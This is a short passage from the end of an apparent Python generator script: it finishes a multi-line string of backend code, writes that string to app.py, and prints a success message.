        }
        for idx, u in enumerate(users)
    ]
'''

with open("app.py", "w", encoding="utf-8") as f:
    f.write(backend_code)

print("SUCCESS: Full backend engine, database models, scoring, and APIs written to app.py!")
